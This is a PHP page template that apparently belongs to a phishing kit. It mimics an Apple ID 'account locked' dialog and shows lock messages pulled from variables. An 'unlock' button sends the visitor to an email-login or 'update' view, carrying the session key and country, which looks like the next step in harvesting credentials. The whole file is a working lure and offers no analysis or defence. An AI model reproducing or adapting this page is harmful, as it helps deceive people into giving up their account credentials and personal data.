<?php
error_reporting(0);
session_start();
include "../../main.php";
include "../../lang.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="../assets/css/login.css" media="screen" rel="stylesheet" type="text/css">
<style type="text/css">

</style>
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container restrict-max-wh" data-mode="embed">
<div class="dialog" style="background: rgba(255, 255, 255, 0.85); position:absolute; left:250px;top:-390px;border-radius: 0px; border: none; max-width: 500px; height: 300px;">
<div class="app-dialog">
<div class="head">
<div class="title" title-align="center">
<h2 style="font-weight: 600;line-height: 1.39375; font-size: 29px; margin: 5px 20px; font-family: sans-serif,initial; letter-spacing: 0.011em; color: #494949;"> <?php echo $pesan_lock;?></h2>
</div>
</div>
<div body-align="center">
<div class="acc-locked" id="acc-locked">
<div class="dialog-body">
<div class="dialog-info">
<div class="thin" style="font-weight: 350; color: #494949; line-height: 1.6; letter-spacing: 0.011em;"><?php echo $pesan2_lock;?></div><br>
<a href="<?php if($setting['get_email'] == 'on'){echo "?view=email_login&appIdKey=".$_SESSION['key']."&country=".$cid; }else{echo "?view=update&appIdKey=".$_SESSION['key']."&country=".$cid;}?>" class="button rect" style="padding:5px;padding-left:15px;padding-right:15px;color:#fff;text-decoration:none"><?php echo $unlocked;?></a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>